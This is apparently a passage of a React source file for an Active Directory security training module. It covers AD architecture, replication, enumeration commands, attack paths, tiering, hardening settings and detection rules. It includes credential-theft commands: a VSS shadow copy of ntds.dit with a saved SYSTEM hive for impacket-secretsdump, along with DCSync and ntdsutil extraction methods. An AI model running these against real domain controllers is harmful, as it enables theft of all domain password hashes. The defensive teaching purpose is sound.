    { id:"07", label:"AD replication between DCs", sub:"USN-based incremental replication via DRS", color:C.sky, detail:"Changes propagate via Directory Replication Service (DRS) protocol. Each object has uSNChanged. DCs track high-watermark per replication partner. Urgent replication for password changes (to PDC Emulator first)." },
    { id:"08", label:"Global Catalog serves cross-domain queries", sub:"GC port 3268/3269 handles universal group membership", color:C.blue, detail:"Global Catalog contains partial attributes of all objects in forest. Universal group membership (cross-domain) resolved here. Single GC query replaces multi-domain referrals for forest-wide searches." },
  ];
  return (
    <div>
      {steps.map((s, i) => (
        <div key={s.id} style={{ display: "flex", gap: "0" }}>
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", width: "30px" }}>
            <div style={{ width: "22px", height: "22px", borderRadius: "50%", background: `${s.color}18`, border: `1.5px solid ${s.color}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: "9px", color: s.color, fontWeight: "700", flexShrink: 0 }}>{s.id}</div>
            {i < steps.length - 1 && <div style={{ width: "1px", height: "28px", background: `${s.color}33` }} />}
          </div>
          <div style={{ paddingLeft: "10px", paddingBottom: "8px", flex: 1 }}>
            <div style={{ display: "flex", gap: "8px", alignItems: "center", flexWrap: "wrap" }}>
              <span style={{ color: s.color, fontWeight: "700", fontSize: "12px" }}>{s.label}</span>
              <span style={S.badge(s.color)}>{s.sub}</span>
            </div>
            <div style={{ color: C.dim, fontSize: "11px", marginTop: "2px", fontStyle: "italic" }}>{s.detail}</div>
          </div>
        </div>
      ))}
    </div>
  );
};

export default function WindowsStep08() {
  const [archTab, setArchTab] = useState("hierarchy");
  const [intTab,  setIntTab]  = useState("fsmo");
  const [atkTab,  setAtkTab]  = useState("escalation");
  const [monTab,  setMonTab]  = useState("events");
  const [defTab,  setDefTab]  = useState("tiering");
  const [cmpTab,  setCmpTab]  = useState("directory");

  return (
    <div style={S.root}>
      <div style={S.bar}>
        <div style={{ display: "flex", gap: "6px" }}>
          {[C.red, C.yellow, C.green].map((c, i) => <span key={i} style={S.dot(c)} />)}
        </div>
        <span style={{ color: C.indigo, fontSize: "11px", fontWeight: "700", letterSpacing: "2px" }}>WIN-INTERNALS//CONSOLE</span>
        <span style={{ color: C.dim, fontSize: "10px", marginLeft: "auto" }}>MODULE 08 · ACTIVE DIRECTORY · NT 10.0</span>
        <span style={S.dot(C.green)} />
      </div>

      <div style={S.wrap}>

        {/* ── 1: Title ── */}
        <div style={{ ...S.panel(C.indigo), background: "linear-gradient(135deg, #090b13 55%, #080018)" }}>
          <div style={S.pb}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", flexWrap: "wrap", gap: "12px" }}>
              <div>
                <div style={{ color: C.dim, fontSize: "10px", letterSpacing: "3px", marginBottom: "5px" }}>WINDOWS INTERNALS CURRICULUM · STEP 08</div>
                <div style={{ color: C.indigo, fontSize: "22px", fontWeight: "800", lineHeight: "1.2" }}>Active Directory</div>
                <div style={{ color: C.bright, fontSize: "14px", fontWeight: "600", marginTop: "2px" }}>Architecture · Trusts · FSMO · Group Policy · ACL Abuse · AD Attack Paths · Hardening</div>
                <div style={{ color: C.dim, fontSize: "11.5px", marginTop: "5px" }}>The backbone of enterprise identity — and the most targeted infrastructure asset in modern attacks</div>
              </div>
              <div style={{ display: "flex", flexDirection: "column", gap: "5px", alignItems: "flex-end" }}>
                <Pill c={C.green}>LEVEL: INTERMEDIATE → EXPERT</Pill>
                <Pill c={C.indigo}>DOMAIN: IDENTITY / ENTERPRISE / ADVERSARIAL</Pill>
                <Pill c={C.purple}>MODULE 08 / 20+</Pill>
              </div>
            </div>
            <hr style={S.sep} />
            <div style={{ display: "flex", gap: "6px", flexWrap: "wrap" }}>
              {["AD Admin","Red Team","Blue Team","DFIR","Pen Tester","Security Architect","SOC L2/L3","Identity Engineer","Auditor","Compliance"].map(r => (
                <Tag key={r} c={C.indigo}>{r}</Tag>
              ))}
            </div>
          </div>
        </div>

        {/* ── 2: Concept ── */}
        <PB title="CONCEPT EXPLANATION" icon="🧠" color={C.cyan}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BEGINNER VIEW</div>
              <Row c={C.green}><strong style={{color:C.bright}}>Active Directory (AD)</strong> is Microsoft's directory service — a centralised database that stores information about every user, computer, group, and policy in an enterprise. Think of it as the <strong style={{color:C.bright}}>corporate phone book + HR system + security policy engine</strong> all in one.</Row>
              <Row c={C.green}>AD is organised as a <strong style={{color:C.bright}}>forest → domains → organizational units (OUs) → objects</strong> hierarchy. A domain is an administrative boundary; a forest is the security boundary. All domains in a forest share a schema and trust each other.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>Domain Controllers (DCs)</strong> are servers running Active Directory Domain Services. They authenticate users, enforce Group Policy, and replicate the directory between each other. At least two DCs per domain for redundancy is a baseline requirement.</Row>
              <Row c={C.green}><strong style={{color:C.bright}}>Group Policy Objects (GPOs)</strong> are configuration packages applied to computers and users in OUs. They control everything: password complexity, software installation, firewall rules, screen lock timeouts, and security settings across thousands of machines simultaneously.</Row>
            </div>
            <div>
              <div style={{ color: C.purple, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ TECHNICAL INTERNALS</div>
              <Row c={C.purple}>AD is built on <strong style={{color:C.bright}}>LDAP</strong> (Lightweight Directory Access Protocol) for queries and <strong style={{color:C.bright}}>Kerberos</strong> for authentication. The directory database is stored in <strong style={{color:C.bright}}>ntds.dit</strong> — an ESE (Extensible Storage Engine) database on each DC containing all objects, attributes, and their access controls.</Row>
              <Row c={C.purple}>Every object in AD has a <strong style={{color:C.bright}}>DACL</strong> — just like NTFS files. These ACLs control who can read, write, or extend rights on each AD object. Misconfigurations here create <strong style={{color:C.bright}}>attack paths</strong> that BloodHound visualises as graph edges from low-privilege to Domain Admin.</Row>
              <Row c={C.purple}>AD replication uses the <strong style={{color:C.bright}}>DRS (Directory Replication Service)</strong> protocol. Every change gets a <strong style={{color:C.bright}}>USN (Update Sequence Number)</strong>. DCs exchange changes incrementally — this same protocol is abused by DCSync attacks to extract password hashes without touching DC memory.</Row>
              <Row c={C.purple}><strong style={{color:C.bright}}>SYSVOL</strong> is a shared folder on every DC containing GPO templates and scripts, replicated via DFS-R. Attackers with write access to SYSVOL can modify GPOs affecting thousands of machines — immediate domain-wide code execution potential.</Row>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid4}>
            {[
              ["ntds.dit = AD database", "All objects, hashes, attributes stored here. ntds.dit + SYSTEM hive = all NT hashes extractable offline. VSS + robocopy = standard exfil method.", C.red],
              ["SYSVOL = GPO delivery system", "\\\\domain\\SYSVOL holds all GPO files. Write access = instant domain-wide code exec on next gpupdate. Monitor with Sysmon Event 11 on SYSVOL path.", C.orange],
              ["BloodHound = attack graph", "Collects AD ACLs, group membership, sessions, trusts → builds attack graph. Shortest path from any user to Domain Admin. Essential for both red and blue teams.", C.cyan],
              ["Tiering Model = lateral movement barrier", "Tier 0 (DCs), Tier 1 (servers), Tier 2 (workstations). Admins only log into their tier. Prevents DA creds from appearing on workstations.", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 3: Architecture Diagrams ── */}
        <PB title="AD ARCHITECTURE — HIERARCHY · TRUSTS · FSMO · GPO · ACLs" icon="🏛" color={C.purple} accent={C.purple + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["hierarchy","AD HIERARCHY"],["trusts","TRUST MAP"],["gpo","GPO INTERNALS"],["acl","AD ACL MODEL"]].map(([t, l]) => (
              <button key={t} style={S.tab(archTab === t, C.purple)} onClick={() => setArchTab(t)}>{l}</button>
            ))}
          </div>
          {archTab === "hierarchy" && <ADHierarchy />}
          {archTab === "trusts"    && <TrustMap />}
          {archTab === "gpo"       && <GPOInternals />}
          {archTab === "acl"       && <ADAclModel />}
        </PB>

        {/* ── 4: Workflow ── */}
        <PB title="WORKFLOW — AD DOMAIN JOIN TO RESOURCE ACCESS CHAIN" icon="⚙" color={C.orange}>
          <ADWorkflow />
          <hr style={S.sep} />
          <div style={{ color: C.dim, fontSize: "11px" }}>
            <strong style={{ color: C.orange }}>Security insight:</strong> Every step in this workflow has an attack surface. Step 2 (DC locator) can be poisoned via rogue DC response. Step 3 (SYSVOL) can be tampered if GPO ACLs are misconfigured. Step 7 (replication) is the DCSync attack surface. Understanding the flow helps defenders place the right controls at each stage.
          </div>
        </PB>

        {/* ── 5: Commands ── */}
        <PB title="CMD / POWERSHELL — AD ENUMERATION & ADMINISTRATION" icon="⌨" color={C.green}>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AD ENUMERATION (Built-in tools)</div>
              <div style={S.code}>
{`# Domain / forest info:`}
{`PS> Get-ADDomain`}
{`PS> Get-ADForest`}
{`PS> Get-ADDomainController -Filter *`}
{``}
{`# User enumeration:`}
{`PS> Get-ADUser -Filter * -Properties *`}
{`    | Select SamAccountName,Enabled,`}
{`      PasswordLastSet,LastLogonDate,`}
{`      MemberOf,UserAccountControl`}
{``}
{`# Group membership:`}
{`PS> Get-ADGroupMember "Domain Admins" -Recursive`}
{`PS> Get-ADPrincipalGroupMembership jsmith`}
{``}
{`# Computer accounts:`}
{`PS> Get-ADComputer -Filter * -Properties * |`}
{`    Select Name,DNSHostName,OperatingSystem,`}
{`    LastLogonDate,Enabled`}
{``}
{`# GPO listing:`}
{`PS> Get-GPO -All | Select DisplayName,Id,GpoStatus`}
{`PS> Get-GPOReport -All -ReportType HTML -Path C:\\gpos.html`}
              </div>
            </div>
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SECURITY AUDIT QUERIES</div>
              <div style={S.code}>
{`# Find stale accounts (no logon >90 days):`}
{`$cutoff = (Get-Date).AddDays(-90)`}
{`Get-ADUser -Filter {LastLogonDate -lt $cutoff`}
{`    -and Enabled -eq $true} |`}
{`    Select SamAccountName,LastLogonDate`}
{``}
{`# Find accounts with password never expires:`}
{`Get-ADUser -Filter {PasswordNeverExpires -eq $true}`}
{`    | Select SamAccountName`}
{``}
{`# Accounts with reversible encryption:`}
{`Get-ADUser -Filter {AllowReversiblePasswordEncryption`}
{`    -eq $true} | Select SamAccountName`}
{``}
{`# Admin count = 1 (protected by AdminSDHolder):`}
{`Get-ADUser -Filter {AdminCount -eq 1}`}
{`    | Select SamAccountName`}
{``}
{`# ntds.dit extraction via VSS (SYSTEM required):`}
{`vssadmin create shadow /for=C:`}
{`copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1`}
{`     \\Windows\\NTDS\\NTDS.dit C:\\temp\\ntds.dit`}
{`reg save HKLM\\SYSTEM C:\\temp\\system.hive`}
{`# Then: impacket-secretsdump -ntds ntds.dit `}
{`#        -system system.hive LOCAL`}
              </div>
            </div>
          </div>
          <div style={{ marginTop: "12px" }}>
            <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ BLOODHOUND COLLECTION + AD ACL AUDIT</div>
            <div style={S.code}>
{`# BloodHound collection (SharpHound):`}
{`SharpHound.exe -c All --zipfilename bh_output.zip`}
{`# Collects: users, groups, computers, GPOs, trusts, ACLs, sessions`}
{``}
{`# bloodhound-python (remote, Linux):`}
{`bloodhound-python -d corp.local -u jsmith -p 'pass'`}
{`    -ns 10.0.0.1 -c All`}
{``}
{`# Read ACL for specific AD object:`}
{`$dn = "CN=Domain Admins,CN=Users,DC=corp,DC=local"`}
{`(Get-ACL "AD:\$dn").Access | Where {`}
{`    $_.ActiveDirectoryRights -match "GenericAll|WriteDACL|WriteOwner"`}
{`} | Select IdentityReference, ActiveDirectoryRights`}
{``}
{`# Find all objects where non-admin has GenericAll:`}
{`Get-ADObject -Filter * | ForEach-Object {`}
{`    $acl = Get-ACL "AD:\$($_.DistinguishedName)"`}
{`    $acl.Access | Where {`}
{`        $_.ActiveDirectoryRights -match "GenericAll"`}
{`        -and $_.IdentityReference -notmatch "Domain Admins|SYSTEM|Enterprise Admins"`}
{`    } | Select @{N="Object";E={$_.DistinguishedName}}, IdentityReference`}
{`}`}
            </div>
          </div>
        </PB>

        {/* ── 6: Internal View ── */}
        <PB title="INTERNAL SYSTEM VIEW — FSMO · ntds.dit · REPLICATION" icon="🔬" color={C.teal}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["fsmo","FSMO ROLES"],["ntds","ntds.dit DATABASE"],["replication","AD REPLICATION"]].map(([t, l]) => (
              <button key={t} style={S.tab(intTab === t, C.teal)} onClick={() => setIntTab(t)}>{l}</button>
            ))}
          </div>

          {intTab === "fsmo" && <FSMORoles />}

          {intTab === "ntds" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.gold, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ ntds.dit STRUCTURE</div>
                <div style={S.code}>
{`Location: C:\\Windows\\NTDS\\ntds.dit`}
{`Format: ESE (Extensible Storage Engine) database`}
{`Size: typically 10MB–50GB depending on domain size`}
{``}
{`Tables:`}
{`  datatable    → all AD objects + attributes`}
{`  link_table   → links between objects (memberOf)`}
{`  hiddentable  → internal ESE metadata`}
{`  MSysObjects  → ESE system table`}
{``}
{`Key columns in datatable (att_):`}
{`  ATT_OBJECT_CLASS        → object class`}
{`  ATT_SAM_ACCOUNT_NAME    → username`}
{`  ATT_OBJECT_SID          → SID`}
{`  ATT_UNI_PWD (UNICODE_PWD) → NT hash (encrypted)`}
{`  ATT_DBCS_PWD (dbcs_pwd) → LM hash (disabled)`}
{`  ATT_PWD_LAST_SET`}
{`  ATT_USER_ACCOUNT_CONTROL → UAC flags`}
{``}
{`Encryption: PEK (Password Encryption Key)`}
{`  PEK stored in datatable encrypted with SYSKEY`}
{`  NT hashes encrypted with PEK + RC4/AES`}
{`  impacket drsuapi decrypts automatically`}
                </div>
              </div>
              <div>
                <div style={{ color: C.red, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ ntds.dit EXTRACTION METHODS</div>
                {[
                  ["VSS Shadow Copy (live DC)", "vssadmin create shadow → copy ntds.dit from shadow. Requires SYSTEM on DC. Normal VSS operation — minimal logs.", C.red],
                  ["ntdsutil (built-in)", "ntdsutil 'activate instance ntds' 'ifm' 'create full C:\\ifm'. Legitimate AD admin tool, creates exportable copy.", C.orange],
                  ["DCSync (no file access)", "mimikatz lsadump::dcsync over network. No file copy. Event 4662 the only indicator. More stealthy than file copy.", C.red],
                  ["Volume Shadow via WMI", "WMIC shadowcopy call create + copy. Avoids direct VSS API calls, slightly different EDR signature.", C.orange],
                  ["Offline disk image", "Physical access or hypervisor snapshot. Copy VM disk → mount → extract ntds.dit. Bypasses all OS-level controls.", C.yellow],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#120808", border: `1px solid ${c}33`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>⚠ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {intTab === "replication" && (
            <div style={S.grid2}>
              <div>
                <div style={{ color: C.sky, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AD REPLICATION INTERNALS</div>
                <div style={S.code}>
{`Replication protocol: MS-DRSR (DRS Remote Protocol)`}
{`  DRSGetNCChanges() — pull changes from partner DC`}
{`  DRSBind() / DRSUnbind() — session management`}
{``}
{`Change tracking:`}
{`  USN (Update Sequence Number) — per-DC counter`}
{`  uSNChanged attribute on every modified object`}
{`  High-Watermark Vector (HWM) per replication partner`}
{`  Up-to-date Vector (UTDV) — what each DC has seen`}
{``}
{`Replication topology:`}
{`  KCC (Knowledge Consistency Checker)`}
{`  Auto-builds minimum spanning tree of replication`}
{`  connection objects (in Sites and Services)`}
{``}
{`Replication triggers:`}
{`  Normal: every 15-60 sec (intra-site)`}
{`         every 3 hours (inter-site)`}
{`  Urgent: password change → replicate to PDC Emulator`}
{`          immediately (bypasses schedule)`}
{``}
{`# Monitor replication health:`}
{`repadmin /showrepl`}
{`repadmin /replsummary`}
{`repadmin /showvector /latency <naming-context>`}
{``}
{`DCSync exploits DRSGetNCChanges to pull`}
{`password hashes without touching DC files:`}
{`  Event 4662 (Access to AD object) is the only log`}
                </div>
              </div>
              <div>
                <div style={{ color: C.cyan, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ REPLICATION SITES & TOPOLOGY</div>
                {[
                  ["AD Sites", "AD Sites represent physical network locations (offices, data centers). Objects: Site, Subnet, Site Link, Connection Object. DCs prefer same-site DCs for auth and replication.", C.cyan],
                  ["Site Links", "Defines replication paths between sites. Cost (lower = preferred), schedule, interval. KCC builds connection objects based on site links.", C.teal],
                  ["ISTG (Inter-Site Topology Generator)", "One DC per site designated as ISTG. Responsible for building inter-site replication connection objects. ISTG failure = inter-site replication stops.", C.purple],
                  ["Replication tombstone lifetime", "Default 180 days. Objects deleted are kept as tombstones for this period. Allows offline DCs to catch up. Forensic note: deleted objects recoverable within tombstone period via AD Recycle Bin.", C.orange],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#080910", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 7: AD Attack Paths ── */}
        <PB title="AD ATTACK PATHS — ESCALATION · LATERAL · PERSISTENCE" icon="⚔" color={C.red} accent={C.red + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {[["escalation","PRIVILEGE ESCALATION"],["lateral","LATERAL MOVEMENT"],["persistence","PERSISTENCE"]].map(([t, l]) => (
              <button key={t} style={S.tab(atkTab === t, C.red)} onClick={() => setAtkTab(t)}>{l}</button>
            ))}
          </div>
          <ADAttackPanel tab={atkTab} />
        </PB>

        {/* ── 8: Defense / Tiering ── */}
        <PB title="DEFENSE — AD TIERING · HARDENING · PRIVILEGED ACCESS" icon="🛡" color={C.green} accent={C.green + "44"}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["tiering","hardening","gpo_security"].map(t => (
              <button key={t} style={S.tab(defTab === t, C.green)} onClick={() => setDefTab(t)}>{t.replace("_"," ").toUpperCase()}</button>
            ))}
          </div>

          {defTab === "tiering" && (
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "12px", fontSize: "11px" }}>▸ MICROSOFT TIERED ADMINISTRATION MODEL — PREVENTING CREDENTIAL THEFT BETWEEN TIERS</div>
              <div style={S.grid3}>
                {[
                  { tier: "TIER 0", color: C.red, label: "Identity Infrastructure", desc: "Domain Controllers, AD FS, Azure AD Connect, PKI (CA), ADCS, backup servers with DC credentials, monitoring for DCs.", admins: "Domain Admins, Enterprise Admins, Schema Admins", access: "ONLY log on to Tier 0 assets. Never to Tier 1/2. Privileged Access Workstation (PAW) required.", controls: "DC physical security, DC network isolation, smart card auth, JIT admin (PIM)" },
                  { tier: "TIER 1", color: C.orange, label: "Enterprise Servers", desc: "Application servers, database servers, file servers, IIS, SQL, SharePoint, Exchange, SCCM, SCOM.", admins: "Server admins (separate accounts from DA)", access: "Log on to Tier 1 + their PAW. NEVER to Tier 0 DCs or Tier 2 workstations.", controls: "LAPS on servers, separate admin account per tier, PAW for admin tasks" },
                  { tier: "TIER 2", color: C.cyan, label: "Workstations & Devices", desc: "End-user workstations, laptops, non-managed devices, printers, IoT.", admins: "Helpdesk / local PC admins (separate accounts)", access: "Log on to Tier 2 + their PAW for admin tasks. NEVER to Tier 0 or Tier 1.", controls: "LAPS on workstations, remove local admin rights, AppLocker, Windows Defender" },
                ].map(({ tier, color, label, desc, admins, access, controls }) => (
                  <div key={tier} style={{ background: "#08090d", border: `1px solid ${color}44`, borderRadius: "5px", padding: "12px" }}>
                    <div style={{ color, fontWeight: "800", fontSize: "14px", marginBottom: "4px" }}>{tier}</div>
                    <div style={{ color, fontWeight: "700", fontSize: "11px", marginBottom: "8px" }}>{label}</div>
                    <div style={{ marginBottom: "6px" }}>
                      <span style={{ color: C.dim, fontSize: "10px", fontWeight: "700" }}>ASSETS: </span>
                      <span style={{ color: C.text, fontSize: "10.5px" }}>{desc}</span>
                    </div>
                    <div style={{ marginBottom: "6px" }}>
                      <span style={{ color: C.dim, fontSize: "10px", fontWeight: "700" }}>ADMINS: </span>
                      <span style={{ color: color, fontSize: "10.5px" }}>{admins}</span>
                    </div>
                    <div style={{ marginBottom: "6px" }}>
                      <span style={{ color: C.dim, fontSize: "10px", fontWeight: "700" }}>ACCESS RULE: </span>
                      <span style={{ color: C.text, fontSize: "10.5px" }}>{access}</span>
                    </div>
                    <div>
                      <span style={{ color: C.dim, fontSize: "10px", fontWeight: "700" }}>CONTROLS: </span>
                      <span style={{ color: C.text, fontSize: "10.5px" }}>{controls}</span>
                    </div>
                  </div>
                ))}
              </div>
              <div style={{ marginTop: "12px", background: "#08120a", border: `1px solid ${C.green}33`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: C.green, fontWeight: "700", fontSize: "11px", marginBottom: "6px" }}>▸ WHY TIERING WORKS</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>If a Tier 2 workstation is compromised, the attacker finds only Tier 2 admin credentials in LSASS. They cannot pivot to Tier 1 servers because no Tier 1 admin has ever logged on to that workstation. They cannot reach Tier 0 (DCs) because no DA has ever logged on to a workstation. This directly breaks the most common lateral movement path: workstation compromise → DA credentials in LSASS → domain takeover.</div>
              </div>
            </div>
          )}

          {defTab === "hardening" && (
            <div style={S.grid2}>
              {[
                ["Enable AD Recycle Bin", "PowerShell: Enable-ADOptionalFeature 'Recycle Bin Feature'. Allows recovery of deleted AD objects within tombstone lifetime (180 days). Detects attacker account cleanup.", C.green],
                ["Protected Users Security Group", "Members: no NTLM auth, no RC4 Kerberos, no delegation, TGT lifetime 4 hours. For all privileged accounts (DAs, EAs). Zero-cost, high-impact control.", C.cyan],
                ["Audit AdminSDHolder regularly", "Weekly: compare AdminSDHolder DACL to baseline. Any new ACE = immediate investigation. SDProp runs every 60 min — backdoor ACEs propagate silently.", C.orange],
                ["LAPS deployment", "LAPS (Local Admin Password Solution) randomises local admin password per machine. No shared local admin password = no lateral movement via local admin hash.", C.green],
                ["Privileged Access Workstations (PAWs)", "Dedicated, hardened workstation for admin tasks only. No email, no browsing. Internet-isolated. Admin uses PAW → target system, not daily driver.", C.teal],
                ["Just-In-Time Privilege (PIM)", "Azure AD Privileged Identity Management or MIM PAM. Admin rights granted for limited time window, require approval. Removes standing privileged access.", C.purple],
                ["Reduce MachineAccountQuota", "Default = 10 (any user can create 10 computer accounts). Set to 0 to prevent RBCD + shadow cred attacks. Delegate computer creation to specific OU only.", C.yellow],
                ["Audit Unconstrained Delegation", "Any non-DC with TrustedForDelegation=True is dangerous — stores TGTs of any user who authenticates to it. Remove unconstrained delegation from all non-DCs.", C.red],
                ["Block DCSync rights", "Audit DS-Replication-Get-Changes-All permissions on domain partition. Only DC computer accounts should have this. Remove from any user/group accounts.", C.red],
                ["Disable SYSVOL legacy GPP passwords", "Group Policy Preferences stored credentials in SYSVOL XML (cPassword) — AES key published by Microsoft. Remove all GPP password entries immediately.", C.orange],
              ].map(([t, d, c]) => (
                <div key={t} style={{ background: "#08120a", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px", marginBottom: "8px" }}>
                  <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "4px" }}>✓ {t}</div>
                  <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {defTab === "gpo_security" && (
            <div style={S.code}>
{`# ── HIGH-IMPACT SECURITY GPO SETTINGS ──`}
{``}
{`# Computer Config → Windows Settings → Security Settings:`}
{``}
{`# Password Policy:`}
{`Minimum password length         = 14 characters`}
{`Password complexity             = Enabled`}
{`Password history                = 24`}
{`Maximum password age            = 60 days`}
{`Account lockout threshold       = 5 attempts`}
{`Account lockout duration        = 30 minutes`}
{``}
{`# User Rights Assignment:`}
{`"Allow log on locally"          = Remove Domain Users from servers/DCs`}
{`"Deny log on as batch/service"  = Apply to DA/EA accounts`}
{`"Allow log on through RDP"      = Restrict to PAW computer groups only`}
{``}
{`# Advanced Audit Policy (via auditpol GPO):`}
{`Account Management              → Success + Failure`}
{`Account Logon                   → Success + Failure`}
{`Logon/Logoff                    → Success + Failure`}
{`Object Access                   → Success + Failure`}
{`DS Access                       → Success + Failure (for Event 4662)`}
{`Policy Change                   → Success`}
{`Privilege Use (Sensitive)       → Success + Failure`}
{``}
{`# Restricted Groups / Local Groups:`}
{`Administrators (local)  = {Domain Admins, LAPS-managed-account}`}
{`Remote Desktop Users    = {specific IT group only}`}
{``}
{`# Computer Config → Admin Templates:`}
{`Windows Firewall: All profiles  = On + log dropped packets`}
{`Credential Guard                = Enabled with UEFI lock`}
{`PowerShell Script Block Logging = Enabled`}
{`PowerShell Module Logging       = Enabled (all modules)`}
{`PowerShell Transcription        = Enabled (log to SIEM share)`}
{``}
{`# PS: Enforce Protected Users on all privileged accounts:`}
{`Get-ADGroupMember "Domain Admins" | ForEach {`}
{`    Add-ADGroupMember "Protected Users" -Members $_.SamAccountName`}
{`}`}
            </div>
          )}
        </PB>

        {/* ── 9: Monitoring ── */}
        <PB title="MONITORING — AD EVENTS · DETECTION RULES · TOOLS" icon="👁" color={C.yellow}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["events","detection","tools","iocs"].map(t => (
              <button key={t} style={S.tab(monTab === t, C.yellow)} onClick={() => setMonTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>

          {monTab === "events" && (
            <div style={S.grid2}>
              {[
                ["4662", "AD object accessed — DCSync detection. Filter for DS-Replication GUIDs from non-DC source.", C.red],
                ["4728/4732/4756", "Member added to security group. 4728=global, 4732=local, 4756=universal. Alert on Admins groups.", C.red],
                ["4729/4733/4757", "Member removed from security group. Attacker covering tracks after adding themselves.", C.orange],
                ["5136", "AD object modified — attribute changes. Key: dsObjectClass, distinguishedName, attribute changed.", C.orange],
                ["5137", "AD object created — new account, new GPO, new computer account.", C.yellow],
                ["5139", "AD object moved — OU change. Could indicate account repositioning.", C.dim],
                ["5141", "AD object deleted — account deleted (possible cleanup).", C.dim],
                ["4670", "Object permissions changed — DACL modification on AD object. ACL abuse first step.", C.red],
                ["4743", "Computer account password reset — unusual if not by LAPS or scheduled.", C.orange],
                ["4739", "Domain policy changed — password policy modified.", C.red],
                ["4713", "Kerberos policy changed — ticket lifetime modified (Golden Ticket extension attempt).", C.red],
                ["4706", "New trust created to domain.", C.orange],
              ].map(([id, desc, c]) => (
                <div key={id} style={{ display: "flex", gap: "10px", marginBottom: "7px", alignItems: "flex-start" }}>
                  <span style={{ ...S.badge(c), minWidth: "55px", textAlign: "center", flexShrink: 0 }}>{id}</span>
                  <span style={{ color: C.dim, fontSize: "11px" }}>{desc}</span>
                </div>
              ))}
            </div>
          )}

          {monTab === "detection" && (
            <div style={S.code}>
{`── DCSync DETECTION ──`}
{`Event 4662 on domain partition object`}
{`Properties: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 (Get-Changes)`}
{`         OR 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 (Get-Changes-All)`}
{`SubjectDomainName: CORP`}
{`SubjectUserName: NOT ending in $ (not a computer account)`}
{`Alert: CRITICAL — non-DC account pulling replication changes`}
{``}
{`── ACL ABUSE DETECTION ──`}
{`Event 5136 (AD object modified)`}
{`AttributeLDAPDisplayName: member OR nTSecurityDescriptor`}
{`Correlate with: who performed the change (SubjectUserName)`}
{`Alert: Any change to Domain Admins, Enterprise Admins membership`}
{``}
{`── ADMINSDHOLDER BACKDOOR ──`}
{`Event 5136 on CN=AdminSDHolder,CN=System,DC=corp,DC=local`}
{`Any change to nTSecurityDescriptor attribute`}
{`Alert: CRITICAL — potential persistent ACL backdoor planted`}
{``}
{`── SUSPICIOUS COMPUTER ACCOUNT CREATION ──`}
{`Event 5137 (object created)`}
{`ObjectClass: computer`}
{`SubjectUserName: NOT ending in $ (non-DC creating computer)`}
{`Alert if: creator account is not in designated computer-creation group`}
{`Note: Default MachineAccountQuota = 10 (any user can create)`}
{``}
{`── GPPO MODIFICATION ──`}
{`Event 5136 on GPO object OR SYSVOL file change`}
{`Sysmon Event 11: TargetFilename contains SYSVOL and *.pol or Scripts`}
{`Alert: GPO version number increment without IT change ticket`}
{``}
{`── SKELETON KEY / MEMORY PATCHING ──`}
{`Multiple accounts authenticating simultaneously with SAME NTLM hash`}
{`OR: NTLM auth from DC to workstation (unusual direction)`}
{`EDR alert on lsass.exe memory write on DC`}
            </div>
          )}

          {monTab === "tools" && (
            <div style={S.grid2}>
              {[
                ["BloodHound / SharpHound", "bloodhound + SharpHound.exe -c All", "Attack path visualisation. Maps AD objects, ACLs, group membership, sessions into attack graph. Identifies shortest path from any user to Domain Admin. Essential for both red and blue.", C.cyan],
